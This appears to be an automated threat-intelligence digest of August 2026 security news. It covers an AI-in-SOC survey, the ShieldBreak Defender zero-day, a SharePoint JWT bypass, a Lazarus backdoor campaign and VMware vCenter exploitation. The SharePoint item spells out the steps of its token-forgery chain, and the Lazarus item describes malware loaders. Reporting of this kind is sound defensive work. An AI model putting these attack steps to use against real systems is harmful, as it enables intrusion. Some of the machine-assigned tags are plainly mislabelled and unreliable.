- Published: 2026-08-12T13:00:00+00:00
- Link: https://www.rapid7.com/blog/post/ai-report-500-security-leaders-reveal-security-operations-transformation
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Something shifted in security operations over the last two years: AI stopped being a pilot program and became the plan. And if you survey 500 security professionals on whether that's going well – as Omdia did, commissioned by Rapid7 – you get a remarkable level of consensus: 97% report positive outcomes, 98% say AI reduces alert fatigue, and 95% say it's helping address staffing shortages. Those numbers are high enough that the story could stop there; AI is working, everyone agrees. Move on. But there's a more interesting finding sitting underneath that consensus, and it tells you something important about where security operations is actually headed. The confidence gap nobody is talking about While frontline SOC teams report strong confidence in AI, executive security leaders like CISOs, CSOs, and VPs are taking a considerably harder look. The research found that executive leaders are 1.6 times more likely than operational security managers to be highly concerned about how AI vendors
```

#### Full body

```
Back to Blog Artificial Intelligence AI is Working in the SOC. So Why are Security Executives More Worried Than Ever? Rapid7 Aug 12, 2026 | Last updated on Aug 12, 2026 | 3 min read DOWNLOAD THE REPORT Something shifted in security operations over the last two years: AI stopped being a pilot program and became the plan. And if you survey 500 security professionals on whether that's going well – as Omdia did, commissioned by Rapid7 – you get a remarkable level of consensus: 97% report positive outcomes, 98% say AI reduces alert fatigue, and 95% say it's helping address staffing shortages. Those numbers are high enough that the story could stop there; AI is working, everyone agrees. Move on. But there's a more interesting finding sitting underneath that consensus, and it tells you something important about where security operations is actually headed. The confidence gap nobody is talking about While frontline SOC teams report strong confidence in AI, executive security leaders like CISOs, CSOs, and VPs are taking a considerably harder look. The research found that executive leaders are 1.6 times more likely than operational security managers to be highly concerned about how AI vendors handle their organization's security data. This isn't a contradiction of the 97% positive sentiment, but rather a maturity signal. When AI was experimental, the question was: does it work? Operational teams answered that. Now that AI is embedded in production SOCs, a different question is arriving at the executive level: how do we govern it? Who is accountable when something is wrong? What happens when the model misses a critical threat, and whose job was it to catch that? These are board-level questions, and the research suggests that the organizations who don't have good answers are about to feel that gap acutely. The human-AI balance is the real differentiator 92% of respondents said AI enhances rather than replaces human analysts. But 41% are actively worried about over-reliance, or that teams could start deferring to AI in moments where an experienced analyst would have caught something the model missed. The best security teams aren't choosing between AI and human expertise. They're building operating models where AI handles the volume – triaging, pattern matching, initial investigations – while analysts lead the decisions that require context, creativity, and accountability. The question for any SOC leader isn't 'should we use AI?' It's 'where does AI create capacity without creating new blind spots?' MDR is being redefined 86% of respondents believe AI-enabled MDR has a clear advantage over traditional approaches. And when asked what they actually expect from an AI-enabled MDR provider, the top answer wasn't faster detection or higher automation rates. It was transparency. 55% said their top expectation is visibility into how AI decisions are being made. 53% want AI explicitly integrated with human analyst expertise. 52% want regular updates on model performance and accuracy. 'We use AI' is not a differentiator anymore. What buyers now want to know is: can you show me exactly how? What this means for your security strategy The Omdia research gives security leaders something most AI content doesn't: an independent benchmark for where the market actually is. Use it to pressure-test your AI governance posture, to reframe conversations with your board, and to evaluate whether your MDR provider can answer the transparency questions that 55% of buyers are now asking. The full report covers all of this in detail, including where organizations remain most cautious, what makes AI adoption succeed or stall, and what the next phase of AI-enabled security operations looks like. Download the full Omdia report . Article Tags Research Security Operations (SOC) Rapid7 Author Posts
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: AI is Working in the SOC. So Why are Security Executives More Worried Than Ever?
  - Published: 2026-08-12T13:00:00+00:00
  - Link: https://www.rapid7.com/blog/post/ai-report-500-security-leaders-reveal-security-operations-transformation
  - Summary: Something shifted in security operations over the last two years: AI stopped being a pilot program and became the plan. And if you survey 500 security professionals on whether that's going well – as Omdia did, commissioned by Rapid7 – you get a remarkable level of consensus: 97% report positive outcomes, 98% say AI reduces alert fatigue, and 95% say it's helping address staffing shortages. Those numbers are high enough that the story could stop there; AI is working, everyone agrees. Move on. But there's a more interesting finding sitting underneath that consensus, and it tells you something important about where security operations is actually headed. The confidence gap nobody is talking about While frontline SOC teams report strong confidence in AI, executive security leaders like CISOs, CSOs, and VPs are taking a considerably harder look. The research found that executive leaders are 1.6 times more likely than operational security managers to be highly concerned about how AI vendors

### Cluster dcf9212f8f — score 10

- Title: Microsoft working on Defender patch for ShieldBreak zero-day
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-08-17T09:05:33+00:00
- Link: https://www.bleepingcomputer.com/news/security/microsoft-working-on-defender-patch-for-shieldbreak-zero-day/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-69414

#### Cluster taxonomy (union across members)
- threat_categories: vulnerability_disclosure, zero_day
- affected_industries: legal_professional
- affected_products: Microsoft BitLocker, Microsoft Defender, Microsoft Windows
- cve_ids: CVE-2026-50656, CVE-2026-69414
- urgency_signals: poc_available, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, vulnerability_disclosure
- affected_industries: legal_professional
- affected_products: Microsoft Windows, Microsoft Defender, Microsoft BitLocker
- cve_ids: CVE-2026-69414, CVE-2026-50656
- urgency_signals: zero_day, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Microsoft is working on a security patch for the "ShieldBreak" zero-day vulnerability disclosed last week by security researcher "Nightmare Eclipse" and now tracked as CVE-2026-69414. [...]
```

#### Full body

```
Microsoft working on Defender patch for ShieldBreak zero-day By Sergiu Gatlan August 17, 2026 05:05 AM 1 On Friday, Microsoft confirmed it has begun working on a security patch for a Defender zero-day vulnerability named "ShieldBreak." A security researcher who uses the "Nightmare Eclipse" handle disclosed this privilege escalation vulnerability after Microsoft released the August 2026 Patch Tuesday security updates. ​"Microsoft is aware of the reported vulnerability and is actively investigating the validity and potential applicability of these claims," a Microsoft spokesperson told BleepingComputer when asked for a statement regarding the new ShieldBreak zero-day. "Microsoft is committed to investigating security issues and updating impacted products to protect customers as soon as possible." Nightmare Eclipse described ShieldBreak as a bypass for RoguePlanet , another Defender privilege escalation flaw disclosed in June, and shared a ShieldBreak proof-of-concept (PoC) exploit that local attackers with limited permissions can use to gain SYSTEM privileges on fully patched Windows 10, Windows 11, and Windows Server systems. "Microsoft has failed to properly patch the RoguePlanet vulnerability CVE-2026-50656, this PoC demonstrates a full patch bypass," Nightmare Eclipse said . "The PoC was tested in the latest version of windows 11 25h2 (+Canary channel) and windows server 2025, the PoC also have a 100% success rate. Please note that Windows 10 (and respective server editions) are not currently supported, they are however vulnerable to ShieldBreak as well." Vulnerability analyst Will Dormann confirmed last week that the ShieldBreak exploit works but added that Microsoft Defender must also be enabled for attackers to escalate privileges. ShieldBreak PoC exploit demo (Nightmare Eclipse) Tracked as CVE-2026-69414 and waiting for a patch On Friday, three days after ShieldBreak was disclosed, Microsoft said it's now tracking the flaw as CVE-2026-69414 and confirmed it's working on a patch, but has yet to acknowledge that Nightmare Eclipse found it. "Microsoft is aware of an elevation of privilege in the Microsoft Malware Protection Engine in Microsoft Defender publicly referred to as 'ShieldBreak,'" the company said. "We are working to provide a high quality security update that addresses this vulnerability. We will provide information in this CVE when the update is available." Nightmare Eclipse publicly disclosed ShieldBreak without notice to Microsoft as part of an ongoing dispute with the company over its vulnerability disclosure and bug bounty practices. Days after the researcher published PoC exploits without prior notice, Microsoft responded with warnings of legal action against people engaging in "malicious activity causing real harm" to its customers, prompting many to believe that the company was directly threatening the security researcher. Since April, Nightmare Eclipse has disclosed multiple zero-day exploits targeting Microsoft Defender, BitLocker, and various other Windows components, now known as LegacyHive , RoguePlanet , BlueHammer , RedSun , YellowKey , GreenPlasma , MiniPlasma , and UnDefend . While the company fixed the YellowKey, GreenPlasma, and MiniPlasma flaws as part of the June 2026 Patch Tuesday and RoguePlanet in July , the other security flaws disclosed by Nightmare Eclipse remain zero-days and are still awaiting an official patch. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: New Microsoft Defender 'ShieldBreak' zero-day grants SYSTEM privileges Microsoft patches LegacyHive Windows zero-day vulnerability New Windows LegacyHive zero-day gives hackers admin privileges Wind
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Microsoft working on Defender patch for ShieldBreak zero-day
  - Published: 2026-08-17T09:05:33+00:00
  - Link: https://www.bleepingcomputer.com/news/security/microsoft-working-on-defender-patch-for-shieldbreak-zero-day/
  - Summary: Microsoft is working on a security patch for the "ShieldBreak" zero-day vulnerability disclosed last week by security researcher "Nightmare Eclipse" and now tracked as CVE-2026-69414. [...]

### Cluster 7f3785d01f — score 10

- Title: AI-Driven Vulnerability Surge Breaks the Traditional Patching Model
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-08-18T13:00:00+00:00
- Link: https://www.securityweek.com/ai-driven-vulnerability-surge-breaks-the-traditional-patching-model/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, supply_chain, vulnerability_disclosure
- affected_industries: financial_services
- urgency_signals: poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, apt_espionage, vulnerability_disclosure
- affected_industries: financial_services
- urgency_signals: poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Rapid7 warns that traditional patch cycles cannot keep pace with soaring vulnerability disclosures and faster exploitation, forcing defenders to prioritize exposure over severity scores. The post AI-Driven Vulnerability Surge Breaks the Traditional Patching Model appeared first on SecurityWeek .
```

#### Full body

```
Recent analysis from Rapid7 demonstrates the fallacy of defenders continuing to rely on patching their way out of problems. “Q2 2026 was not just another busy quarter in cyber. It felt more like a stress test of the way we currently manage exposure. Traditional patch cycles are being overwhelmed by the sheer volume of vulnerabilities and attacker speed and precision,” writes Rapid7 in its latest report titled ‘the compression era’. “Vulnerabilities are being disclosed at higher volume, proof-of-concept code is appearing faster, exploitability is being tested earlier, and attackers are getting better at turning public information into operational access.” SecurityWeek spoke to Christiaan Beek, Rapid7’s VP of cyber intelligence for a deeper understanding of the cause and effect of this stress. But let’s be clear from the start: the compressive force behind this stress test is artificial intelligence (AI). Disclosures of high and critical vulnerabilities (CVSS 7 to 10) doubled from 4,268 in Q2 2025 to 8,539 in Q2 2026, notes the analysis . In the same period, new exploited vulnerabilities increased 8% to 40. The huge difference between the number of vulnerabilities found and the number exploited is down to the surrounding context. “Discovery and exploitation are separate issues,” explains Beek. “AI can do both, but an attacker cannot use the exploit if the target is sitting behind multiple firewalls and other defensive mechanisms.” (Image Credit: Rapid7) The volume of vulnerabilities found by AI is, however, never likely to decrease. New apps are continually being released, and usually with new vulnerabilities. And then there’s the growing use of vibe coding. “I’ve seen research on vibe-coded financial apps that all contained the same vulnerabilities; indicating that AI is using old templates to write new code still containing the old mistakes,” adds Beek. In short, vibe coding introduces vulnerabilities into new code that can then be found by new AI scans. The problem this creates for defenders is worsened by the oft-quoted asymmetry between attack and defense. “Attackers only need one weak spot in our environment. We need to defend so much, including the classic endpoints like a laptop, a computer, a server, a firewall. But now, the landscape is changing fast with interactions around APIs and the supply chain. We have become so dependent on multiple types of vendors that the exposure to visibility for our defenders is way more difficult than that for the attacker. This is changing the game,” he continues. It all points toward what the report describes as ‘a widening gap between what’s disclosed and what any team can realistically triage’. There has been an increase in what Rapid7 describes as ‘Holy Grail’ vulnerabilities. This is Rapid7’s own term for a vulnerability that doesn’t require credentials, or user interaction. These have shown a 9-point year over year increase, now accounting for 25 of 40 exploited vulnerabilities in Q2 2026. “We’ve seen a lot of those being released. As an attacker, I can execute close to a device or product without needing any form of authentication – and that’s a serious flaw,” he explains. Advertisement. Scroll to continue reading. Persistent nation-state activity from the cybersecurity axis of evil (China, Russia, Iran and North Korea, often known as CRINK) is also highlighted in the report. Russia is active primarily in Ukraine and against Ukraine’s supporters; Iran is targeting the US and US allies; China is active against Taiwan; and North Korea targets anything it thinks it can monetize. “It’s not that nation-state APTs are any more advanced than financially motivated criminal gangs,” comments Beek, “it’s more that motivations and resources are different. Ninety-nine percent of nation-state motivation requires persistence for long term espionage and a small percentage for possible sabotage. They have the skills, the budget, and all the resources you can imagine. So, they can develop far more
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: AI-Driven Vulnerability Surge Breaks the Traditional Patching Model
  - Published: 2026-08-18T13:00:00+00:00
  - Link: https://www.securityweek.com/ai-driven-vulnerability-surge-breaks-the-traditional-patching-model/
  - Summary: Rapid7 warns that traditional patch cycles cannot keep pace with soaring vulnerability disclosures and faster exploitation, forcing defenders to prioritize exposure over severity scores. The post AI-Driven Vulnerability Surge Breaks the Traditional Patching Model appeared first on SecurityWeek .

### Cluster 324eddbb3a — score 10

- Title: Attackers Exploit SharePoint Authentication Bypass After Public PoC Release
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-13T06:09:48+00:00
- Link: https://thehackernews.com/2026/08/attackers-exploit-sharepoint.html
- Fetch status: ok
- Member count: 2
- Corroborating source count: 1
- Strong signals: CVE-2026-55040, Microsoft SharePoint

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft
- affected_industries: telecommunications
- affected_products: Anthropic/Claude, Azure, Microsoft SharePoint
- cve_ids: CVE-2026-45659, CVE-2026-50522, CVE-2026-55040, CVE-2026-56164, CVE-2026-58644
- urgency_signals: poc_available, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: credential_theft
- affected_industries: telecommunications
- affected_products: Microsoft SharePoint, Anthropic/Claude, Azure
- cve_ids: CVE-2026-55040, CVE-2026-45659, CVE-2026-56164, CVE-2026-58644, CVE-2026-50522
- urgency_signals: preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Threat actors have begun to exploit a newly disclosed Microsoft SharePoint vulnerability following the release of a proof-of-concept (PoC) code. The vulnerability in question is CVE-2026-55040 (CVSS score: 9.1), which refers to a critical security feature bypass that stems from weak authentication. It was patched by Microsoft as part of its July 2026 Patch Tuesday updates. "The authentication
```

#### Full body

```
Attackers Exploit SharePoint Authentication Bypass After Public PoC Release  Ravie Lakshmanan  Aug 13, 2026 Vulnerability / Enterprise Security Threat actors have begun to exploit a newly disclosed Microsoft SharePoint vulnerability following the release of a proof-of-concept (PoC) code. The vulnerability in question is CVE-2026-55040 (CVSS score: 9.1), which refers to a critical security feature bypass that stems from weak authentication. It was patched by Microsoft as part of its July 2026 Patch Tuesday updates. "The authentication feature could be bypassed as this vulnerability allows impersonation," Microsoft said in an advisory for the flaw last month. "Exploiting this vulnerability could allow an attacker to disclose files and modify data, but the attacker cannot impact the availability of the system." According to Defused Cyber , threat actors are leveraging a PoC exploit released by Rapid7 earlier this week, once again indicating fresh flaws are being rapidly abused in real-world attacks. It's worth mentioning that CVE-2026-55040 is the fifth SharePoint vulnerability to be exploited this year after CVE-2026-45659 , CVE-2026-56164, CVE-2026-58644 , and CVE-2026-50522 . Successful exploitation of CVE-2026-55040 can allow an unauthenticated attacker to sidestep authentication on a vulnerable SharePoint server and perform arbitrary operations as a SharePoint site user or administrator. The vulnerability, per Rapid7 , is due to "several issues" in the JWT token validation pipeline. Specifically, it chains four different weaknesses to allow an unauthenticated remote attacker to forge a valid JWT and impersonate any SharePoint site user. Rapid7 said the issue resides in two different classes that implement the token parsing and validation logic for Bearer service-to-service (S2S) tokens - SPJsonWebSecurityTokenHandlerV2 SPJsonWebSecurityBaseTokenHandlerV2 The entire chain can be exploited by an attacker as follows - Attacker sends a JWT with "alg: none" in the outer header, so no signature is required in the outer token. The actor token's x5t header contains SharePoint's own STS certificate thumbprint, making it possible to resolve a signing key with no verification. The resolved certificate is not in TrustedSecurityTokenServices, allowing the issuer to be accepted. The actor token's signature is a non-empty value, e.g., AAAA, which is never verified. Rapid7's Python-based PoC uses the forged JWT token to query a target's domain controller, enumerate users by SID, and auto-locate the SID for the user to find a site administrator. As of writing, it's unclear who is behind the exploitation activity or what their end goals are. Telemetry data captured by KEVIntel shows that a total of 12 exploitation attempts were recorded since July 19, 2026. Out of these, eight took place on August 12 and 13, 2026, indicating that the release of the PoC has played a role in these efforts. The 12 exploitation attempts have originated from eight unique IP addresses corresponding to five countries and regions, including Hong Kong, Japan, the Netherlands, Taiwan, and the U.S. In light of a spike in active exploitation, SharePoint users are advised to keep their instances up-to-date for optimal protection. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Application Security , Authentication Security , Cyber Attack , enterprise security , Identity Security , Microsoft , Patch Management , Vulnerability , Web Security ⚡ Top Stories This Week Azure Cosmos DB Flaw Exposed Platform-Wide Key That Could Access Any Database Anthropic Says Claude Mistook the Open Internet for a CTF and Breached Three Organizations Researchers Report 84 Flaws in 4G and 5G Cores, Including a Session Hijacking Flaw Cheap Android TV Boxes Pose as Phones and Turn Owners’ Broadband Into Proxies N-able Says Attackers Take Over N-central Servers After Init
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Exploit SharePoint Authentication Bypass After Public PoC Release
  - Published: 2026-08-13T06:09:48+00:00
  - Link: https://thehackernews.com/2026/08/attackers-exploit-sharepoint.html
  - Summary: Threat actors have begun to exploit a newly disclosed Microsoft SharePoint vulnerability following the release of a proof-of-concept (PoC) code. The vulnerability in question is CVE-2026-55040 (CVSS score: 9.1), which refers to a critical security feature bypass that stems from weak authentication. It was patched by Microsoft as part of its July 2026 Patch Tuesday updates. "The authentication

### Cluster 22bf2708a0 — score 10

- Title: Lazarus Exploits Windows Zero-Day to Gain SYSTEM Access and Deploy Backdoor
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-12T17:39:27+00:00
- Link: https://thehackernews.com/2026/08/lazarus-exploits-windows-zero-day-to.html
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Lazarus

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, web_shell_backdoor, zero_day
- actor_attribution: Lazarus
- affected_industries: aviation_defense
- cve_ids: CVE-2026-68820
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, apt_espionage, web_shell_backdoor
- actor_attribution: Lazarus
- affected_industries: aviation_defense
- cve_ids: CVE-2026-68820
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The North Korean threat actor known as Lazarus Group has been attributed to the zero-day exploitation of a newly patched security flaw impacting Microsoft Windows to deliver a never-before-seen backdoor targeting defense and aerospace companies across France, Germany, Brazil, and India. The activity, per Check Point Research, is part of Operation Dream Job, a long-running cyber espionage and
```

#### Full body

```
Lazarus Exploits Windows Zero-Day to Gain SYSTEM Access and Deploy Backdoor  Ravie Lakshmanan  Aug 12, 2026 Vulnerability / Cyber Espionage The North Korean threat actor known as Lazarus Group has been attributed to the zero-day exploitation of a newly patched security flaw impacting Microsoft Windows to deliver a never-before-seen backdoor targeting defense and aerospace companies across France, Germany, Brazil, and India. The activity, per Check Point Research, is part of Operation Dream Job , a long-running cyber espionage and social engineering campaign orchestrated by Pyongyang-backed hackers to target professionals worldwide with fake-but-compelling job offers at firms like Lockheed Martin and Enveil to steal sensitive data and install malware by approaching them on platforms like LinkedIn, pretending to be recruiters in an attempt to build trust. The attacks have been found to exploit CVE-2026-68820 (CVSS score: 7.0), a privilege escalation flaw affecting Windows Ancillary Function Driver for WinSock ("AFD.sys") that was patched by Microsoft as part of its Patch Tuesday updates for August 2026. Check Point Research told The Hacker News that it reported the vulnerability to Microsoft in late July 2026, although it said "we are familiar with a successful implementation of the CVE in the beginning of June." As observed in prior campaign waves, victims are lured through bogus recruiter messages and tricked into opening a malicious PDF or installing a trojanized PDF viewer, which is then used to install a new backdoor called Troy that grants remote access to the compromised machine. The end goal of these intrusions is to seize complete control of infected computers and bypass security controls. The use of a trojanized PDF viewer is a tried-and-tested tactic adopted by the Lazarus Group in conjunction with Dream Job , with the threat actors abusing this method as far back as 2022. Two different parallel infection sequences have been detected as part of the latest attacks - DLL side-loading , in which victims are instructed to download an encrypted archive that's used to trigger a DLL side-loading chain. The malicious DLL ("libmupdf.dll") is used to display a bogus job description lure, while it stealthily downloads and executes in memory a lightweight downloader dubbed MISTPEN . The downloader communicates with threat actor-controlled infrastructure using Microsoft Graph API and OneDrive to retrieve and run reconnaissance and persistence modules and trigger the "AFD.sys" driver exploit, before deploying ForestTiger (aka ScoringMathTea), which provides remote access to the host. Trojanized "SecurityPDF" PDF viewer , in which victims are instructed to download SecurityPDF from a website impersonating Enveil. Once installed, it monitors for any PDF document opened through it for a special marker ("This document is encrypted with sumatrapdf reader!!!!!!!!!!!!"). If such a marker is present, the application decrypts and launches an embedded payload that's responsible for loading a backdoor called Troy directly into memory. The DLL implant supports 17 operator commands to facilitate file enumeration, upload and download, archive and exfiltration, interactive shell access, process termination, in-memory DLL injection, and configuration updates. High-level overview of the DLL sideloading infection chain. MISTPEN, for its part, loads at least four different modules - GetInfoPlugin ("Release_GetInfoPlugin_x64.dll"), to profile the host and exfiltrate the collected information as a single wide-character string PvPlugin ("Release_PvPlugin_x64.dll"), to collect host reconnaissance data and details about running processes OneScreenCapture ("OneScreenCapture64.dll"), to take screenshots of the current desktop, including all monitors, and transmit them as JPEG images LPE (local privilege escalation) loader , which gathers host information, generates new key material using the ML-KEM post-quantum key encapsulation algorithm, and uses the ne
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Lazarus Exploits Windows Zero-Day to Gain SYSTEM Access and Deploy Backdoor
  - Published: 2026-08-12T17:39:27+00:00
  - Link: https://thehackernews.com/2026/08/lazarus-exploits-windows-zero-day-to.html
  - Summary: The North Korean threat actor known as Lazarus Group has been attributed to the zero-day exploitation of a newly patched security flaw impacting Microsoft Windows to deliver a never-before-seen backdoor targeting defense and aerospace companies across France, Germany, Brazil, and India. The activity, per Check Point Research, is part of Operation Dream Job, a long-running cyber espionage and
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Lazarus Used Post-Quantum Key Exchange to Deliver Zero-Day
  - Published: 2026-08-12T13:35:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/lazarus-post-quantum-key-dream-job/
  - Summary: Lazarus malware used post-quantum key exchange to protect delivery of a Windows zero-day exploit

### Cluster 4535ef9ae8 — score 10

- Title: Attackers Exploit VMware vCenter Vulnerability to Gain Persistent Remote Access
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-12T09:01:54+00:00
- Link: https://thehackernews.com/2026/08/attackers-exploit-vmware-vcenter.html
- Fetch status: ok
- Member count: 3
- Corroborating source count: 2
- Strong signals: CVE-2026-59310, VMware

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, ransomware_extortion, web_shell_backdoor
- actor_attribution: UNC5174
- affected_industries: government
- affected_products: VMware
- cve_ids: CVE-2026-59309, CVE-2026-59310
- urgency_signals: critical_cvss
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: apt_espionage, web_shell_backdoor
- actor_attribution: UNC5174
- affected_industries: government
- affected_products: VMware
- cve_ids: CVE-2026-59310, CVE-2026-59309
- urgency_signals: critical_cvss
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Threat actors have begun to actively exploit a recently patched critical security flaw in Broadcom VMware vCenter, according to new findings from QUIRSO. The vulnerability in question is CVE-2026-59310 (CVSS score: 9.8), a directory-traversal vulnerability in the VMware vCenter server that a malicious actor with network access can exploit to execute arbitrary code. Patches for the flaw were
```

#### Full body

```
Attackers Exploit VMware vCenter Vulnerability to Gain Persistent Remote Access  Ravie Lakshmanan  Aug 12, 2026 Vulnerability / Threat Intelligence Threat actors have begun to actively exploit a recently patched critical security flaw in Broadcom VMware vCenter, according to new findings from QUIRSO. The vulnerability in question is CVE-2026-59310 (CVSS score: 9.8), a directory-traversal vulnerability in the VMware vCenter server that a malicious actor with network access can exploit to execute arbitrary code. Patches for the flaw were released by Broadcom late last month. The German cybersecurity company said it discovered the activity following an incident response engagement. The attack chain is said to have exhibited path traversal activity consistent with the flaw, followed by the deployment of a malicious cron job to establish persistence on the host using reverse_ssh, an open-source tool used for setting up SSH connections to threat actor-controlled infrastructure. Compromised systems identified by QUIRSO were found to first establish contact with the attacker's domains on August 3, five days after Broadcom publicly disclosed the flaw. In all, there are as many as 361 unique victim IP addresses located across 47 countries. Most of them are located in Germany, the U.S., Turkey, Iran, and France. "While the attacker might have had prior knowledge of the vulnerability, the strong correlation between the time of disclosure and exploitation suggests the disclosure as the initial starting point for the campaign," QUIRSO added. It's not clear who is behind the exploitation campaign, but it's believed to be the work of a suspected advanced persistent threat (APT) actor. It's worth pointing out that VMware appliances have been a lucrative target for Chinese threat actors like UNC5174 , who have weaponized security flaws impacting VMware Tools and VMware vCenter in various espionage campaigns. In April 2025, SentinelOne disclosed details of a China-nexus threat cluster dubbed PurpleHaze that targeted a South Asian government supporting entity with a Windows backdoor called GoReShell, which uses functionalities from the reverse_ssh tool to establish reverse SSH connections to attacker-controlled hosts. The use of reverse_ssh is notable as it allows the attacker to establish an outbound connection to an endpoint under their control, effectively bypassing security controls designed to prevent suspicious inbound requests. "The presence of reverse_ssh should not, by itself, be treated as proof of malicious activity," QUIRSO noted. "In combination with unauthorized installation, unexpected outbound connections or execution on a vulnerable vCenter appliance, however, it is a high-priority indicator requiring investigation." The disclosure comes as Defused Cyber said it's observing a spike in scanning against VMware vCenter that is indicative of potential exploitation efforts targeting CVE-2026-59309 (CVSS score: 9.8). "Our honeypots are logging increased fingerprinting – such as version probes via POST /sdk/ (RetrieveServiceContent) and walks of the /websso SAML SSO flow – coinciding with Broadcom's VMSA-2026-0006 (CVE-2026-59309, unauth auth-bypass in vmdir, CVSS 9.8)," the cybersecurity company said. Denis Szadkowski, COO and co-founder of QUIRSO GmbH, told The Hacker News that there is not enough evidence at this stage to correlate exploitation and scanning efforts using CVE-2026-59309 with the intrusion set or the attacker infrastructure associated with CVE-2026-59310. "What we can say with much higher confidence is that the activity we investigated represents a successful compromise rather than merely exploitation attempts, and the forensic evidence strongly points toward CVE-2026-59310 as the initial access vector," Szadkowski added. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  APT , enterprise securit
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Exploit VMware vCenter Vulnerability to Gain Persistent Remote Access
  - Published: 2026-08-12T09:01:54+00:00
  - Link: https://thehackernews.com/2026/08/attackers-exploit-vmware-vcenter.html
  - Summary: Threat actors have begun to actively exploit a recently patched critical security flaw in Broadcom VMware vCenter, according to new findings from QUIRSO. The vulnerability in question is CVE-2026-59310 (CVSS score: 9.8), a directory-traversal vulnerability in the VMware vCenter server that a malicious actor with network access can exploit to execute arbitrary code. Patches for the flaw were
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Global Threat Campaign Hits Critical VMware vCenter Flaw
  - Published: 2026-08-13T20:45:17+00:00
  - Link: https://www.darkreading.com/vulnerabilities-threats/global-threat-campaign-critical-vmware-vcenter-flaw
  - Summary: Exploitation against CVE-2026–59310 began earlier this month, and patching the vulnerability may not be enough to fully mitigate the threat.

### Cluster 8fb5179107 — score 10

- Title: ShieldBreak Zero-Day PoC Claims Microsoft Defender Patch Bypass With SYSTEM Access
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-12T06:41:38+00:00
- Link: https://thehackernews.com/2026/08/shieldbreak-zero-day-poc-claims.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-50656, Microsoft Defender

#### Cluster taxonomy (union across members)
- threat_categories: vulnerability_disclosure, zero_day
- affected_products: Microsoft Defender, Microsoft Windows
- cve_ids: CVE-2026-50656
- urgency_signals: poc_available, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, vulnerability_disclosure
- affected_products: Microsoft Defender, Microsoft Windows
- cve_ids: CVE-2026-50656
- urgency_signals: zero_day, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The security researcher going by the name Chaotic Eclipse (aka INFINITE NIGHTMARE, MSNightmare, and Nightmare-Eclipse) has released a proof-of-concept (PoC) for a new Microsoft zero-day called ShieldBreak. The vulnerability, rooted in Microsoft Defender for Windows, demonstrates a patch bypass for CVE-2026-50656 (CVSS score: 7.8), otherwise known as RoguePlanet. RoguePlanet has been described
```

#### Full body

```
